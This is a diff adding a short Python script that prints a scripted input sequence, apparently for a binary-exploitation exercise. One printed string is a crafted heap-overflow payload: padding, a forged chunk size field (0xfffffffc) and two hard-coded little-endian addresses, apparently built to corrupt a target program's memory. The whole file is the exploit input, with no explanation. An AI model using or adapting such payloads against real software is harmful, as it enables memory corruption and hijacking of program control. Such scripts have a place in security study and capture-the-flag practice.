@@ -1,0 +1,6 @@
+print("RCB")
+print("a\nNischithShreesh\n1\na")
+print("NischithShre\x10\x11\x11\x11\xfc\xff\xff\xff\x54\xb0\x83\x03\xc4\xb0\x83\x03\n1")
+print("r")
+print("2")
+print("x")
